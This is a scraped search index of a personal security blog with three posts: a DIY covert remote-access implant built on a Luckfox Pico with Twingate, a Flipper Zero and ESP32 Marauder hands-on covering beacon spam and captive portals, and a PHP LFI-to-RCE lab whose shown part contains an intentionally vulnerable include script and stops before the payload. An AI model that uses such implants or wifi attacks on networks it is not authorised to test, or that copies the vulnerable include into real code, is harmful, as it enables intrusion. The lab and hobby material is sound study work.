[{"categories":["Pentest","Remote Access"],"content":"In this post, I share my experience building a DIY stealth remote access device using the Luckfox Pico Max RV1106. Inspired by the commercial LAN Turtle but seeking a more affordable solution, I created this device to enable remote network access without complex port forwarding or traditional VPN setups. This project served as both a practical solution and a valuable learning experience in hardware integration and network security.","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"In this post, I share my experience building a DIY stealth remote access device using the Luckfox Pico Max RV1106. Inspired by the commercial LAN Turtle but seeking a more affordable solution, I created this device to enable remote network access without complex port forwarding or traditional VPN setups. This project served as both a practical solution and a valuable learning experience in hardware integration and network security. ‚ö†Ô∏è WARNING ‚ö†Ô∏è This project uses free third-party services! And as the saying goes: if it's free, you are the product! This is just an example of usage. My goal is not to connect to locations that could compromise sensitive information or infrastructure. Idea My goal was simple: I wanted reliable remote access to local networks without the hassle of complex VPN setups or router configuration. Since I often don‚Äôt have access to the router, I needed a true plug-and-play solution. While the commercial LAN Turtle provides these capabilities, its high price pushed me to explore a more cost-effective alternative. This project became an opportunity not just to build my own solution, but also to gain a deeper understanding of the underlying technologies. Hardware Selection After researching various options, I chose the Luckfox Pico Max RV1106 as the core of my project. This compact device offers an impressive set of features at a remarkably affordable price point. ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:0:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Specifications Component Details Processor Cortex A7 @ 1.2GHz NPU Max: 1 TOPS, supports int4, int8, and int16 ISP Input 5M @30fps (Max) Memory Max: 256MB DDR2 USB USB 2.0 Host/Device Camera MIPI CSI 2-lane GPIO 26 √ó GPIO pins Ethernet Port 10/100M Ethernet controller and embedded PHY Default Storage SPI NAND FLASH (256MB) While it lacks some features I would have liked (PoE and Gigabit Ethernet), the price-to-performance ratio made it an excellent choice for my project. ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:1:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Alternative Hardware Options For those interested in trying different hardware, here are some alternatives I considered: Raspberry Pi Zero W + USB Ethernet Orange Pi Zero 3 GL.iNet GL-MT300N V2 ESP32-S3 ¬ø¬øMaybe?? M5Stack LLM630 üõçÔ∏è Shopping List \u0026 Cost Analysis Here‚Äôs what I used for this project: Luckfox Pico Max RV1106 - ‚Ç¨18 64GB microSD card - ‚Ç¨10 microSD to USB adapter - ‚Ç¨2 Total: ‚Ç¨30 Cost Comparison: Commercial LAN Turtle: ~‚Ç¨200-300 DIY Solution: ‚Ç¨30 Savings: ~85-90% Optional Additions: 3D printed case: ‚Ç¨2-5 (filament cost) Power bank (portable use): ‚Ç¨15-25 USB-C to Ethernet adapter: ‚Ç¨10-15 ÔøΩ Smecurity \u0026 Legal Considerations Important: This device should only be used on networks you own or have explicit permission to access. Unauthorized network access is illegal in most jurisdictions. Security Best Practices: Change default passwords immediately after setup Enable SSH key authentication and disable password login Regularly update the system: sudo apt update \u0026\u0026 sudo apt upgrade Monitor device access logs: sudo journalctl -f Use strong API tokens and rotate them regularly Consider using a dedicated VLAN for the device Privacy Considerations: Third-party VPN services can potentially log your traffic Consider self-hosted alternatives like WireGuard for sensitive environments Review the privacy policy of your chosen VPN provider üöÄ Implementation Luckfox Pico I performed all testing on Linux. Here‚Äôs how I put everything together: ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:2:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Setting Up the SDK First, I prepared my development environment: sudo apt update sudo apt-get install -y git ssh make gcc gcc-multilib g++-multilib module-assistant expect g++ gawk texinfo libssl-dev bison flex fakeroot cmake unzip gperf autoconf device-tree-compiler libncurses5-dev pkg-config bc python-is-python3 passwd openssl openssh-server openssh-client vim file cpio rsync git clone https://github.com/LuckfoxTECH/luckfox-pico.git cd luckfox-pico ./build.sh lunch In the lunch script, I selected: RV1106 board [6] SD Card boot [0] Ubuntu OS [1] ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:3:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Building the Operating System After several attempts, I discovered that the third-party VPN required the UTS namespace to be enabled in the kernel. Here‚Äôs how I activated it: ./build.sh kernelconfig I navigated to: -\u003e General setup -\u003e Namespaces support (NAMESPACES [=Y]) [*] UTS namespace (NEW) After saving the configuration and building the kernel, the output files were stored in luckfox-pico/output/image/. ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:4:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Luckfox Pico OS Installation For installation, I used a Windows VM and the SocToolKit software from the SDK (luckfox-pico/tools/windows/SocToolKit). The process was straightforward - just selecting the compiled image files and target microSD card. The official documentation provides detailed instructions if needed. ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:5:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Network Configuration After the OS installation, I needed to configure the eth0 interface for DHCP. This ensures the device automatically gets an IP address when connected to a network: sudo nano /etc/network/interfaces.d/eth0 Add the following configuration: auto eth0 iface eth0 inet dhcp To apply the changes without rebooting: sudo ifdown eth0 \u0026\u0026 sudo ifup eth0 Alternatively, restart the networking service: sudo systemctl restart networking Finally, reboot the device to ensure all configurations are properly loaded: sudo reboot Verify the configuration is working: ip addr show eth0 ping -c 4 8.8.8.8 ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:6:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"VPN Setup Twingate For remote access, I chose Twingate for its excellent free tier, which perfectly suited my needs. Since I had never used it before, I decided to try it for this project. Alternatives like OpenZiti and Tailscale also offer great solutions, but Twingate stood out for its simplicity and ease of setup. Created a Twingate account Created a new Network (Network \u003e Remote Networks \u003e + Remote Network - select ‚Äúother‚Äù) Added a Connector (Network \u003e ‚Äúnetwork name‚Äù \u003e + Add Connector) Installed the Connector on my Luckfox Pico (‚ÄúInside Connector‚Äù \u003e Linux \u003e Generate Tokens \u003e Copy Command) SSH‚Äôd into the Luckfox Pico and run: curl \"https://binaries.twingate.com/connector/setup.sh\" | sudo TWINGATE_ACCESS_TOKEN=\"\" TWINGATE_REFRESH_TOKEN=\"\" TWINGATE_NETWORK=\"\u003cname\u003e\" TWINGATE_LABEL_DEPLOYED_BY=\"linux\" bash ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:7:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Twingate Client Setup (Optional) If you want to use the device as a client as well, install the Twingate client: # Install client curl -s https://binaries.twingate.com/client/linux/install.sh | sudo bash # Configure twingate setup # Start service twingate start ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:8:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Resources Configuration I added resources through the Twingate dashboard (Network \u003e Resources \u003e + Resource) ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:9:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Automatically Adding Resources To make the device truly plug-and-play, I created a Python script that automatically discovers and adds network resources via the Twingate API. This eliminates the need to manually configure resources for each new network. 1. Install Python dependencies: sudo apt update sudo apt install python3-pip pip3 install gql requests 2. Settings \u003e API \u003e Generate Token 3. Replace the variables in the script accordingly. import json import os import socket import time from gql import gql, Client from gql.transport.requests import RequestsHTTPTransport # Twingate API settings API_URL = \"https://\u003cname\u003e.twingate.com/api/graphql/\" API_KEY = \"api-token\" TARGET_NETWORK_NAME = \"\u003cnetwork-name\u003e\" # Path for the resources tracking file RESOURCES_FILE = \"/home/pico/scripts/resources.json\" # Function to check internet connectivity def check_internet_connection(host=\"8.8.8.8\", port=53, timeout=3): \"\"\" Check if there is an internet connection by trying to connect to Google's DNS server. Returns True if connection is available, False otherwise. \"\"\" try: socket.setdefaulttimeout(timeout) socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port)) return True except socket.error: return False # Rest of your existing code remains the same QUERY_REMOTE_NETWORKS = gql(\"\"\" query GetRemoteNetworkDetails { remoteNetworks(after: null, first: 10) { edges { node { id name connectors { edges { node { id name publicIP privateIPs remoteNetwork { id name } } } } } } } } \"\"\") MUTATION_CREATE_RESOURCE = gql(\"\"\" mutation CreateResource($name: String!, $address: String!, $remoteNetworkId: ID!) { resourceCreate( name: $name, address: $address, remoteNetworkId: $remoteNetworkId ) { ok error entity { id name address { type value } } } } \"\"\") def load_existing_resources(): try: with open(RESOURCES_FILE, 'r') as f: resources = json.load(f) for r in resources: if 'remote_network_id' not in r: r['remote_network_id'] = None return resources except FileNotFoundError: return [] def save_resource(resource, remote_network_id): resources = load_existing_resources() resources.append({ 'id': resource['id'], 'name': resource['name'], 'address': resource['address']['value'], 'remote_network_id': remote_network_id }) with open(RESOURCES_FILE, 'w') as f: json.dump(resources, f, indent=2) def is_resource_exists(address, remote_network_id, existing_resources): return any( r['address'] == address and r['remote_network_id'] == remote_network_id for r in existing_resources ) def setup_client(): transport = RequestsHTTPTransport( url=API_URL, headers={\"X-API-KEY\": API_KEY}, use_json=True, ) return Client(transport=transport, fetch_schema_from_transport=True) def get_target_network(client): response = client.execute(QUERY_REMOTE_NETWORKS) for edge in response[\"remoteNetworks\"][\"edges\"]: network = edge[\"node\"] if network[\"name\"] == TARGET_NETWORK_NAME: return network return None def create_resource(client, name, address_value, remote_network_id): params = { \"name\": name, \"address\": address_value, \"remoteNetworkId\": remote_network_id } response = client.execute(MUTATION_CREATE_RESOURCE, variable_values=params) if not response[\"resourceCreate\"][\"ok\"]: raise Exception(f\"Failed to create resource: {response['resourceCreate']['error']}\") return response[\"resourceCreate\"][\"entity\"] def automate_resource_creation(): client = setup_client() existing_resources = load_existing_resources() print(f\"Searching for target network: {TARGET_NETWORK_NAME}...\") target_network = get_target_network(client) if not target_network: print(f\"Network '{TARGET_NETWORK_NAME}' not found.\") return print(f\"Found network: {target_network['name']}\") remote_network_id = target_network['id'] for connector_edge in target_network[\"connectors\"][\"edges\"]: connector = connector_edge[\"node\"] public_ip = connector.get(\"publicIP\") private_ips = connector.get(\"privateIPs\", []) if public_ip and not is_resource_exists(public_ip, remote_network_id, existing_resources): resource_name = f\"Resource-Public-{","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:10:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Network Interface Issues Problem: eth0 interface not coming up automatically # Check interface status ip link show eth0 # Manually bring up interface sudo ip link set eth0 up sudo dhclient eth0 Problem: DHCP not working # Check DHCP client logs sudo journalctl -u dhcpcd # or sudo journalctl -u systemd-networkd ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:11:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Twingate Connection Issues Problem: Connector not connecting # Check connector status sudo systemctl status twingate-connector # Restart connector sudo systemctl restart twingate-connector # Check logs sudo journalctl -u twingate-connector -f Problem: Resources not accessible Verify resource permissions in Twingate dashboard Check if ports are correctly configured Test connectivity: telnet \u003cresource-ip\u003e \u003cport\u003e ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:12:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Pentest","Remote Access"],"content":"Python Script Issues Problem: API script failing # Install required dependencies pip3 install gql requests # Check script permissions chmod +x /home/pico/scripts/twingate-updater.py # Test script manually python3 /home/pico/scripts/twingate-updater.py 3D Printed Case To protect my device and make it more portable, I looked into printing a case. Here are the models I found most useful: Thingiverse Model Printables Model Performance \u0026 Limitations Network Performance: Ethernet: 100Mbps (Fast Ethernet) Typical throughput: 80-90Mbps Latency: +20-50ms (depending on VPN service) Power Consumption: Idle: ~1.5W Active: ~2.5W Can run on power banks for 8-12 hours Limitations: No PoE support (requires separate power) 100Mbps max speed (no Gigabit) Limited to 256MB RAM Depends on third-party VPN service reliability How to Use? It‚Äôs super simple! I just plug the hardware into the Ethernet port, power it with a power bank, a DC adapter, or whatever nearby USB port happens to offer 5V and voil√†! Future Improvements Here‚Äôs what I‚Äôm planning to add to my project: ESP32 integration (ESP-Hosted) Battery installation RTC implementation Penetration testing scripts Custom OS with ESP32, security tools, and testing scripts ","date":"Feb 4, 2025","objectID":"/2025/lanturtle-vpn/:13:0","tags":["Hardware","Security","Remote Access"],"title":"DIY LAN Turtle - Building a Stealth Remote Access Device","uri":"/2025/lanturtle-vpn/"},{"categories":["Hardware","Security","Flipper Zero"],"content":"First impressions from Flipper Zero","date":"Oct 21, 2023","objectID":"/2023/flipperzero/","tags":["FlipperZero","Hands-on","ESP32-WROOM","NRF24L01"],"title":"Exploring the Versatile Flipper Zero: First Impressions and Hands-On","uri":"/2023/flipperzero/"},{"categories":["Hardware","Security","Flipper Zero"],"content":"I recently acquired a Flipper Zero, a multi-tool device that can be used for a variety of tasks, including security research, hardware hacking, and DIY electronics. In this blog post, I will share my first impressions of the Flipper Zero, as well as some of the projects I have been working on with it. I am excited to explore all of the possibilities that the Flipper Zero has to offer. I believe that it is a valuable tool for anyone who is interested in security, hardware, or electronics. I look forward to sharing my experiences with the Flipper Zero in future blog posts. Summary Summary Introduction What is a Flipper Zero üí∏ Why buy a Flipper Zero? üèÅ First Steps Installing Flipper Zero Firmware Update Installing New Firmware ‚û°Ô∏è Let‚Äôs Get Started NFC üî® Building GPIO modules NRF24L01 Connection with Flipper Zero Connect NRF24L01 board with Flipper Zero ESP32-WROOM Connection with Flipper Zero Connect ESP32-WROOM-32U to Flipper Zero Connect Micro SD TF Module to ESP32-WROOM-32U Install Marauder on ESP32-WROOM ü§û First Plugin References Introduction In the realm of security research, hardware hacking, and DIY electronics, the Flipper Zero has emerged as a versatile and indispensable tool. In this blog post, penned by the enthusiastic h4ndsh, we‚Äôll embark on a journey to discover the Flipper Zero‚Äôs capabilities through their first-hand experiences. From the initial setup to exploring NFC capabilities and expanding its functionalities, this post promises to be an insightful guide for both beginners and seasoned hackers alike. So, let‚Äôs delve into the world of the Flipper Zero and see how it can revolutionize your security and electronics endeavors. Happy hacking! üê¨üíªüîê What is a Flipper Zero The Flipper Zero does not need presentations. It is already a fairly well-known equipment for good and bad reasons. For those who are reading this post and have never heard of this equipment, the Flipper Zero is an open-source security and ethical hacking equipment, designed for security testing, protocol analysis, and software development activities. üí∏ Why buy a Flipper Zero? The Flipper Zero is a versatile tool that can be used for a variety of purposes, including hacking. It is a popular choice for beginners because it is relatively inexpensive and easy to use, but it is also a powerful tool that can be used by experienced hackers to perform complex attacks. It is a multi-tool device: The Flipper Zero can be used to interact with a wide variety of devices and protocols, including NFC, RFID, IR, and sub-GHz wireless. This makes it a great tool for learning about different hacking techniques and how they work. It is open source: The Flipper Zero is open source, which means that the code and hardware are freely available for anyone to inspect and modify. This makes it a great tool for learning about how hacking tools work and how to develop your own. It is customizable: The Flipper Zero is highly customizable, with a variety of add-on boards and accessories available. This makes it a great tool for learning about hardware and electronics, and for developing your own custom hacking tools. The Flipper Zero has gained popularity not only for its hacking capabilities but also as an educational tool for exploring hardware knowledge. Apart from its specific features tailored for hacking activities, the Flipper Zero‚Äôs appeal among enthusiasts extends to its role in hardware learning. Its versatility allows users to delve into the intricacies of hardware components, gaining hands-on experience with various electronic systems. The device‚Äôs educational value stems from its user-friendly interface and extensive documentation, making it accessible to beginners and experienced tinkerers alike. The Flipper Zero‚Äôs open-source nature fosters a vibrant community of developers who continuously create and share new tools and resources, further enriching the learning experience. üèÅ First Steps Experimenting with the tools that come with the official software is definite","date":"Oct 21, 2023","objectID":"/2023/flipperzero/:0:0","tags":["FlipperZero","Hands-on","ESP32-WROOM","NRF24L01"],"title":"Exploring the Versatile Flipper Zero: First Impressions and Hands-On","uri":"/2023/flipperzero/"},{"categories":["Hardware","Security","Flipper Zero"],"content":"Installing Flipper Zero Firmware Update First, we need to download the software that communicates with the Flipper Zero via USB. To do this, download from flipperzero.one. I‚Äôm using Linux, the chosen version should be the Linux one. It is also possible to install it on an iPhone or an Android smartphone (via Bluetooth). File Download mv qFlipper-x86_64-1.3.2.AppImage /usr/bin/flipper chmod +x /usr/bin/flipper which flipper To start the program, superuser permission sudo may be necessary depending on the circumstances. sudo flipper Interface ","date":"Oct 21, 2023","objectID":"/2023/flipperzero/:1:0","tags":["FlipperZero","Hands-on","ESP32-WROOM","NRF24L01"],"title":"Exploring the Versatile Flipper Zero: First Impressions and Hands-On","uri":"/2023/flipperzero/"},{"categories":["Hardware","Security","Flipper Zero"],"content":"Installing New Firmware The provided firmware is sufficient for any type of study, but let‚Äôs install a firmware developed by the Flipper Zero community that offers many more tools and plugins. There are several forks of the Flipper Zero firmware. Here are some examples: Repository Name Description Xtreme-Firmware This firmware is a complete overhaul of the Official Firmware, and also features lots of awesome code-bits from Unleashed. Unleashed-Firmware Most stable custom firmware focused on new features and improvements of original firmware components, with almost no UI changes. RogueMaster This firmware is a fork of Unleashed and the main Flipper Devices FW! We are NOT paywalled. I will try to keep active development and updates from both in this build along with any other projects that can be found to be useful to the community. I try to keep this FW build the most cutting edge with updates from both and updates from nearly all active community projects. See the RM Games and Plugins for a list of most of those projects. To get started, we need to download the firmware. In this case, I will use unleashed-firmware. I will download version flipper-z-f7-update-unlshd-063.tgz. unleashed-firmware With the firmware downloaded, simply access the firmware update option, click on Install from file and select the file flipper-z-f7-update-unlshd-063.tgz, ensuring that the Flipper Zero is already connected to the computer. ‚û°Ô∏è Let‚Äôs Get Started With everything set up, let‚Äôs get started! ","date":"Oct 21, 2023","objectID":"/2023/flipperzero/:2:0","tags":["FlipperZero","Hands-on","ESP32-WROOM","NRF24L01"],"title":"Exploring the Versatile Flipper Zero: First Impressions and Hands-On","uri":"/2023/flipperzero/"},{"categories":["Hardware","Security","Flipper Zero"],"content":"NFC The first attempt I made was to read an NFC card. NFC (Near Field Communication) is a short-range wireless technology that allows devices to exchange data quickly and easily. It works by creating a magnetic field around two devices when they are brought close together, typically within 10 centimeters. This magnetic field can then be used to transmit data between the two devices. Read an real NFC card NFC is used in a variety of applications, including: Mobile payments Transit passes Access control Data sharing NFC is a versatile and convenient technology that is becoming increasingly common in a variety of applications. Overall, NFC is a powerful and versatile technology that has a wide range of potential applications. üî® Building GPIO modules The development of GPIO modules for the Flipper Zero is a creative endeavor that involves designing, creating, and implementing novel functionalities. This process encompasses a wide range of activities, from devising innovative attacks to crafting new hardware boards and exploring diverse applications. It encourages ingenuity in utilizing the GPIO (General Purpose Input/Output) capabilities of the Flipper Zero for both practical and experimental purposes, expanding the device‚Äôs capabilities and fostering a community-driven approach to innovation. ","date":"Oct 21, 2023","objectID":"/2023/flipperzero/:2:1","tags":["FlipperZero","Hands-on","ESP32-WROOM","NRF24L01"],"title":"Exploring the Versatile Flipper Zero: First Impressions and Hands-On","uri":"/2023/flipperzero/"},{"categories":["Hardware","Security","Flipper Zero"],"content":"NRF24L01 NRF24L01+PA+LNA The nRF24L01+PA+LNA 2.4GHz RF Wireless Modules are RF transceiver modules that can be used for wireless communications at up to 1100 meters. It‚Äôs important to note that this module exclusively operates in the 2.4GHz band at data rates of 250Kbps, 1Mbps or 2Mbps. Max operating current is \u003c 115mA. The Flipper Zero can communicate with devices at greater distances, which can be useful for applications such as: Remote control of remote devices Data transmission between devices Creating wireless sensor networks The NRF24L01 can be beneficial in the Flipper Zero for: Improving connectivity in areas with potential interference Enabling long-range communication with low-power consumption Facilitating seamless communication with compatible devices at lower frequencies (below 1GHz) Enhancing overall performance for applications that demand extended wireless reach and robust connections. ","date":"Oct 21, 2023","objectID":"/2023/flipperzero/:3:0","tags":["FlipperZero","Hands-on","ESP32-WROOM","NRF24L01"],"title":"Exploring the Versatile Flipper Zero: First Impressions and Hands-On","uri":"/2023/flipperzero/"},{"categories":["Hardware","Security","Flipper Zero"],"content":"Connection with Flipper Zero Material: 1x PCB Board 1x nRF24L01 Board 1x DC/DC Buck Converter (1.8V, 3V, 3.7V, or 5V to 3.3V) In addition to these materials, you will also need some basic soldering equipment, such as a soldering iron, solder, and flux. Connect NRF24L01 board with Flipper Zero Flipper Zero NRF24L01 A7 MOSI A6 MISO A4 CSN B3 SCK B2 CE GND GND 3V3 VCC Left disconnected IRQ This is my final testing board for Sub GHz with the Flipper Zero. NRF24L01 Board Playground Information Flipper Zero and NRF24L01 Board ","date":"Oct 21, 2023","objectID":"/2023/flipperzero/:3:1","tags":["FlipperZero","Hands-on","ESP32-WROOM","NRF24L01"],"title":"Exploring the Versatile Flipper Zero: First Impressions and Hands-On","uri":"/2023/flipperzero/"},{"categories":["Hardware","Security","Flipper Zero"],"content":"ESP32-WROOM The ESP32-WROOM is a versatile and powerful microcontroller module. A dual-core microcontroller with integrated Wi-Fi and Bluetooth capabilities. This tiny yet potent module serves as a playground for hackers, security researchers, and tinkerers seeking to explore the world of hardware hacking and IoT security. ESP32-WROOM-32U Marauder Attacks: WiFi attacks via the ESP32 Marauder involve sending crafted WiFi packets for specific goals. Possible attacks include ‚ÄúBeacon Spam List‚Äù, ‚ÄúBeacon Spam Random‚Äù and ‚ÄúRick Roll Beacon‚Äù. These tactics aim to disrupt network discovery and create confusion among nearby devices. Caution is crucial, as unauthorized use of such techniques can be unethical and illegal. Captive Portals: Hackers can create captive portals with the ESP32 to trick users into connecting to a rogue Wi-Fi network. Once connected, attackers can control the network traffic and potentially launch various exploits. IoT Device Exploitation: As the IoT ecosystem continues to grow, the ESP32 can be used to audit and assess the security of IoT devices. It can help identify vulnerabilities in smart home devices, industrial systems, and more. Wireless Sniffing and Packet Analysis: The module‚Äôs Wi-Fi capabilities make it an excellent tool for monitoring and analyzing wireless networks. It can be used to capture packets, discover network vulnerabilities, and perform Wi-Fi penetration testing. ","date":"Oct 21, 2023","objectID":"/2023/flipperzero/:4:0","tags":["FlipperZero","Hands-on","ESP32-WROOM","NRF24L01"],"title":"Exploring the Versatile Flipper Zero: First Impressions and Hands-On","uri":"/2023/flipperzero/"},{"categories":["Hardware","Security","Flipper Zero"],"content":"Connection with Flipper Zero Material: 1x PCB Board 1x ESP32-WROOM-32U 1x Micro SD Card 8GB 1x Micro SD TF Module In addition to these materials, you will also need some basic soldering equipment, such as a soldering iron, solder, and flux. Connect ESP32-WROOM-32U to Flipper Zero Flipper Zero ESP32-WROOM-32U TX RX RX TX GND GND 5V 5V Connect Micro SD TF Module to ESP32-WROOM-32U To fully utilize the Marauder project‚Äôs potential, the integration of a card reader is crucial for enabling network traffic capture (.pcap) and Captive Portal creation. This enhancement will transform the Marauder into a comprehensive network security and penetration testing tool. Micro SD TF Module ESP32-WROOM-32U GND GND VCC VCC or 3v3 MISO C19 MOSI D23 SCK D18 CS 12 This is my final testing board for Wi-Fi with the Flipper Zero. ESP32 Board Playground Information Marauder Install Marauder on ESP32-WROOM I used the Easy Flipper Zero ESP32 Flash to install Marauder on the ESP32-WROOM. There are other ways to do it, but this one was the easiest for me. ü§û First Plugin The first app is always the hardest, but it‚Äôs also where we learn the most about C programming with Flipper Zero libraries. My first app was a simple echo. In it, I learned: How to create a simple project How to install the devkit How to compile How to compile and upload First App That‚Äôs All! Thanks! Happy hacking üê¨ References https://flipperzero.one https://github.com/justcallmekoko/ESP32Marauder https://github.com/UberGuidoZ/Flipper https://github.com/SkeletonMan03/FZEasyMarauderFlash ","date":"Oct 21, 2023","objectID":"/2023/flipperzero/:4:1","tags":["FlipperZero","Hands-on","ESP32-WROOM","NRF24L01"],"title":"Exploring the Versatile Flipper Zero: First Impressions and Hands-On","uri":"/2023/flipperzero/"},{"categories":["PoC","Learning"],"content":"In this instance, I will delve into an LFI (Local File Inclusion) vulnerability and an RCE (Remote Code Execution) vulnerability. I will utilize the tools within the 'pearcmd.php' file to craft manipulated files. Within a web environment, we can leverage the functionalities of 'pearcmd' by controlling command-line parameters. This Proof of Concept (PoC) is highly specialized, yet it serves as an opportunity for me to explore new methods of penetration within web environments.","date":"Oct 12, 2023","objectID":"/2023/phpinfo/","tags":["php7","phpinfo"],"title":"PHP \u003c= 7.3 Local File Inclusion with RCE (PoC)","uri":"/2023/phpinfo/"},{"categories":["PoC","Learning"],"content":"In this instance, I will delve into an LFI (Local File Inclusion) vulnerability and an RCE (Remote Code Execution) vulnerability. I will utilize the tools within the ‚Äòpearcmd.php‚Äô file to craft manipulated files. Within a web environment, we can leverage the functionalities of ‚Äòpearcmd‚Äô by controlling command-line parameters. This Proof of Concept (PoC) is highly specialized, yet it serves as an opportunity for me to explore new methods of penetration within web environments. Summary Summary Introduction Environment Setup Docker PHP Environment Exploration Initialization Exploit Reverse Shell Real World Mitigation References Introduction I would like to start by thanking the cybersecurity community and a few people who were instrumental in this post. First, I want to express my gratitude to @phithon_xg for all the hard work he has done. I highly recommend reading the article he published on this topic. I would also like to thank @_JohnHammond for bringing this topic to light and creating a very informative video about this proof of concept. In this exploration, we‚Äôll embark on a quest to understand and exploit two critical security issues: LFI (Local File Inclusion) and RCE (Remote Code Execution). Our path leads us to the powerful ‚Äòpearcmd.php‚Äô file, a toolkit that enables us to craft manipulated files and exert control over a web environment by manipulating command-line parameters. This post introduces a highly focused Proof of Concept (PoC), designed to push the boundaries of penetration within web environments. While specific in scope, it serves as a valuable opportunity to expand our knowledge and gain insights into innovative techniques for securing web systems. Join us on this enlightening journey as we unlock the secrets of web system vulnerabilities. Environment Setup The test environment will be created within a CT (Container) in Proxmox by installing PHP through Docker. This approach simplifies the setup of a testing environment, specifically with PHP version 7. However, it‚Äôs important to note that for this environment to work as intended, there must exist a pre-existing vulnerability related to Local File Inclusion (LFI). This vulnerability is the key to our exploration and allows us to demonstrate and understand the exploitation of LFI and RCE vulnerabilities effectively. ","date":"Oct 12, 2023","objectID":"/2023/phpinfo/:0:0","tags":["php7","phpinfo"],"title":"PHP \u003c= 7.3 Local File Inclusion with RCE (PoC)","uri":"/2023/phpinfo/"},{"categories":["PoC","Learning"],"content":"Docker In this Docker code block, we are setting up a container environment based on the PHP 7.0.0 image. The COPY section copies all files from the ‚Äòapp‚Äô directory to the ‚Äò/var/www/html/‚Äô directory within the container. We then set the working directory to ‚Äò/var/www/html/‚Äô and start an embedded PHP server on port 8080. FROM php:7.0.0 COPY app/* /var/www/html/ WORKDIR /var/www/html/ CMD [\"php\", \"-S\", \"0.0.0.0:8080\"] mkdir app cd app ","date":"Oct 12, 2023","objectID":"/2023/phpinfo/:1:0","tags":["php7","phpinfo"],"title":"PHP \u003c= 7.3 Local File Inclusion with RCE (PoC)","uri":"/2023/phpinfo/"},{"categories":["PoC","Learning"],"content":"PHP Environment Here, in the ‚Äòapp/index.php‚Äô file, we have a simple PHP script. It performs a file inclusion based on the ‚Äòfile‚Äô parameter passed through the request. This is an example of vulnerable code, as there is no proper validation of the ‚Äòfile‚Äô parameter, making it susceptible to Local File Inclusion (LFI) attacks. File app/index.php \u003c?php include $_REQUEST['file']; ?\u003e In the ‚Äòapp/phpinfo.php‚Äô file, we have a script that displays PHP information in the phpinfo() format. This file doesn‚Äôt have a specific vulnerability but is included for demonstration purposes and to provide useful information about the PHP configuration in the test environment. File app/phpinfo.php \u003c?php phpinfo(); ?\u003e Exploration Once the environment is configured, the container must be initialized and its bash opened. ","date":"Oct 12, 2023","objectID":"/2023/phpinfo/:2:0","tags":["php7","phpinfo"],"title":"PHP \u003c= 7.3 Local File Inclusion with RCE (PoC)","uri":"/2023/phpinfo/"},{"categories":["PoC","Learning"],"content":"Initialization sudo docker build -t phpfilerce . sudo docker run -d -p 8080:8080 phpfilerce docker ps sudo docker exec -it \u003cCONTAINER ID\u003e /bin/bash ","date":"Oct 12, 2023","objectID":"/2023/phpinfo/:3:0","tags":["php7","phpinfo"],"title":"PHP \u003c= 7.3 Local File Inclusion with RCE (PoC)","uri":"/2023/phpinfo/"},{"categories":["PoC","Learning"],"content":"Exploit Once we create a phpinfo file, we will open it in the browser at http://localhost:8080/phpinfo.php. In order for this exploit to work, we should look for the ‚ÄúDirective‚Äù register_argc_argv and the ‚ÄúLocal Value‚Äù and the ‚ÄúMaster Value‚Äù should be set to ‚ÄúON‚Äù. PHP Info If so, then we can experiment with these arguments by adding the string ?h4ndsh immediately after the ‚Äúphpinfo.php‚Äù. We can verify that an array is created in $_SERVER[‚Äúargv‚Äù]. PHP Info 